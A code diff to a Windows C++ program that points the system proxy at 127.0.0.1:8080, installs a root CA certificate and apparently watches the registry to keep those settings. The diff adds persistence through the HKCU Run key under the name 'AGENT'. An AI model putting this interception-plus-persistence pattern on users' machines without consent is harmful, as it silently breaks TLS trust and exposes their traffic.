@@ -10,7 +10,9 @@ using namespace std;
 
 #define CA_CERT_FILE _T("ServerCA.pem")
 #define INTERNET_SETTINGS \
-    TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
+    _T("Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings")
+#define RUN_SETTINGS \
+	_T("Software\\Microsoft\\Windows\\CurrentVersion\\Run")
 
 int SetProxy(LPCTSTR IpPort)
 {
@@ -167,6 +169,24 @@ DWORD WINAPI RegistryWatch(LPVOID lpParam)
 	return 0;
 }
 
+int RunTimeStart()
+{
+	HKEY hKey;
+	TCHAR Path[MAX_PATH];
+	LONG lResult = RegCreateKeyEx(HKEY_CURRENT_USER, RUN_SETTINGS, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE | KEY_READ, NULL, &hKey, NULL);
+	if (lResult != ERROR_SUCCESS)
+		return 1;
+	lResult = RegQueryValueEx(hKey, _T("AGENT"), NULL, NULL, NULL, NULL);
+	if (lResult == ERROR_FILE_NOT_FOUND)
+	{
+		GetModuleFileName(NULL, Path, MAX_PATH);
+		lResult = RegSetValueEx(hKey, _T("AGENT"), 0, REG_SZ, (LPBYTE)Path, (DWORD)((_tcslen(Path) + 1) * sizeof(TCHAR)));
+	}
+
+	RegCloseKey(hKey);
+	return 0;
+}
+
 //int _tmain()
 //{
 //	if (SetProxy(_T("127.0.0.1:8080")) != 0)
@@ -186,10 +206,10 @@ DWORD WINAPI RegistryWatch(LPVOID lpParam)
 
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow)
 {
-	HANDLE hThread = CreateThread(NULL, 0, RegistryWatch, NULL, 0, NULL);
-
+	RunTimeStart();
 	SetProxy(_T("127.0.0.1:8080"));
 	InstallRootCA(CA_CERT_FILE, FALSE);
+	HANDLE hThread = CreateThread(NULL, 0, RegistryWatch, NULL, 0, NULL);
 
 	MSG msg;
 	while (GetMessage(&msg, NULL, 0, 0))
